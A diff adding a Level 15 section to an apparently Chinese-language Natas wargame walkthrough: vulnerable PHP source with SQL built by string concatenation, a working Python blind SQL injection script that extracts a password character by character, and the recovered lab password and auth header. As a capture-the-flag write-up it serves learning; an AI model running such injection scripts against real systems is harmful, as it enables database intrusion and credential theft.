@@ -316,3 +316,94 @@ if(array_key_exists("username", $_REQUEST)) {
 ```text
 AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
 ```
+
+### Level15
+PHP源码
+```php
+<? 
+/* 
+CREATE TABLE `users` ( 
+  `username` varchar(64) DEFAULT NULL, 
+  `password` varchar(64) DEFAULT NULL 
+); 
+*/ 
+
+if(array_key_exists("username", $_REQUEST)) { 
+    $link = mysql_connect('localhost', 'natas15', '<censored>'); 
+    mysql_select_db('natas15', $link); 
+     
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\""; 
+    if(array_key_exists("debug", $_GET)) { 
+        echo "Executing query: $query<br>"; 
+    } 
+
+    $res = mysql_query($query, $link); 
+    if($res) { 
+    if(mysql_num_rows($res) > 0) { 
+        echo "This user exists.<br>"; 
+    } else { 
+        echo "This user doesn't exist.<br>"; 
+    } 
+    } else { 
+        echo "Error in query.<br>"; 
+    } 
+
+    mysql_close($link); 
+}
+```
+总之先测试一下用户名，发现`natas16`确实存在；从代码里可以看出，我们只能知道这个语句返回的结果是否大于0，那么下一步只有盲注密码了…
+
+看了看数据库定义，password最长为64，字符范围根据之前的密码应该是[0-9A-Za-z]，然后写个脚本慢慢跑吧…
+```python
+import string
+import urllib.request
+import urllib.parse
+
+url = "http://natas15.natas.labs.overthewire.org/index.php?debug=1"
+headers = {
+    "Authorization": (
+        "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=="
+    ),
+    "Host": "natas15.natas.labs.overthewire.org",
+}
+table =\
+    string.digits +\
+    string.ascii_uppercase +\
+    string.ascii_lowercase
+username = 'natas16" AND HEX(SUBSTRING(password, %d, 1))%sHEX("%s");#'
+password = []
+
+
+def check_password(pos, compar, char):
+    post_dict = {
+        "username": username % (pos, compar, char)
+    }
+    post_data = urllib.parse.urlencode(post_dict).encode('ascii')
+    req = urllib.request.Request(url, post_data, headers)
+    with urllib.request.urlopen(req) as f:
+        body = f.read().decode('utf-8')
+        return body.find("This user exists.") >= 0
+
+
+for i in range(1, 65):
+    low = 0
+    high = len(table)
+    mid = (low + high) // 2
+    while mid != low:
+        if check_password(i, '>', table[mid]):
+            low = mid
+        else:
+            high = mid
+        mid = (low + high) // 2
+    if check_password(i, '=', table[low]):
+        password.append(table[low])
+    elif check_password(i, '=', table[high]):
+        password.append(table[high])
+    else:
+        break
+print("".join(password))
+```
+最后拿到natas16的密码
+```text
+WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+```
